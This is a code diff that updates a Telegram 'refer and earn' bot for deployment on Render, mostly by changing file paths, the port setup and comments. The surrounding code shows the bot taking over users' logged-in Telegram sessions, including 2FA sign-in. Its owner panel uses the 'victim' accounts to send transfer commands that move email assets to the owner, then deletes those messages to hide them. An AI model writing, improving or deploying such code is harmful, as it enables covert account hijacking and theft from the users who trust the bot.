@@ -39,11 +39,10 @@ FONT_MAP = {
     'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
 }
 def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
-def p_style(text): return f"<code>{text}</code>" # Comma hata diya
+def p_style(text): return f"<code>{text}</code>"
 
-# ================== DATABASE ==================
-DB_PATH = "/data/refer_bot.db"
-os.makedirs("/data", exist_ok=True)
+# ================== DATABASE (Render Fix) ==================
+DB_PATH = "refer_bot.db" # /data hata diya hai Render ke liye
 
 def init_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
@@ -96,11 +95,16 @@ temp_clients = {}
 user_states = {}
 numpad_data = {}
 
-# ================== FASTAPI ==================
+# ================== FASTAPI (Render Port Fix) ==================
 web_app = FastAPI()
+
 @web_app.get("/")
 def read_root(): return {"status": "Alive"}
-def run_web(): uvicorn.run(web_app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+
+def run_web():
+    # Render apna PORT environment variable deta hai
+    port = int(os.environ.get("PORT", 8080))
+    uvicorn.run(web_app, host="0.0.0.0", port=port)
 
 # ================== USERBOT AUTOMATION ==================
 async def get_or_connect_client(user_id):
@@ -217,7 +221,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"<b>{f_txt('Use the buttons below to start earning:')}</b>"
     )
     
-    if welcome_img:
+    if welcome_img and os.path.exists(welcome_img):
         try:
             await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
         except:
@@ -237,7 +241,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
             user_states[uid] = None; return
 
-    # 2FA handling
     if uid in temp_clients and temp_clients[uid].get('state') == '2fa':
         try:
             await temp_clients[uid]['client'].sign_in(password=text)
@@ -387,7 +390,7 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
         [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')}", callback_data="admin_claim")],
         [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")] # NAYA BUTTON
+        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")]
     ]
     await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
@@ -417,7 +420,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"🖼 {f_txt('Send the image you want to set as Welcome Photo')}:")
         user_states[uid] = 'set_welcome_img_wait'
 
-# Naya handler photo ke liye
 async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = user_states.get(uid)
@@ -425,11 +427,10 @@ async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     if state == 'set_welcome_img_wait':
         try:
             photo_file = await update.message.photo[-1].get_file()
-            # FadeHost ki /data directory me save karenge
-            file_path = f"/data/welcome_img.jpg"
+            # Render ke liye simple path
+            file_path = f"welcome_img.jpg" 
             await photo_file.download_to_drive(file_path)
             
-            # Database me path save karo
             db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (file_path,))
             
             await update.message.reply_text(f"✅ {f_txt('Welcome Photo set successfully!')}")
@@ -467,10 +468,8 @@ async def manual_claim_all(owner_id, query):
             if not emails: continue
 
             for email in emails:
-                # LIVE LOG: Transferring
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
-                # Step 1: Transfer from victim
                 await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
                 await asyncio.sleep(4)
                 
@@ -479,10 +478,8 @@ async def manual_claim_all(owner_id, query):
                     await victim_client.delete_messages(target_bot, msgs[0].id)
                 except: pass
                 
-                # LIVE LOG: Claiming
                 await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
-                # Step 2: Claim from owner
                 await target_owner_client.send_message(owner_target_bot, email)
                 await asyncio.sleep(4)
                 
@@ -501,7 +498,9 @@ async def manual_claim_all(owner_id, query):
 
 # ================== MAIN ==================
 def main():
+    # Web server ko background thread me start karo (Render ke liye)
     threading.Thread(target=run_web, daemon=True).start()
+    
     app_bot = Application.builder().token(BOT_TOKEN).build()
 
     app_bot.add_handler(CommandHandler("start", start))
@@ -510,9 +509,10 @@ def main():
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
     app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_"))
     
-    # Photo handler Owner ke liye (Group 0 me taaki pehle chale)
+    # Photo handler Owner ke liye
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
     
+    # Text handler
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
 
     logger.info("Bot started successfully.")
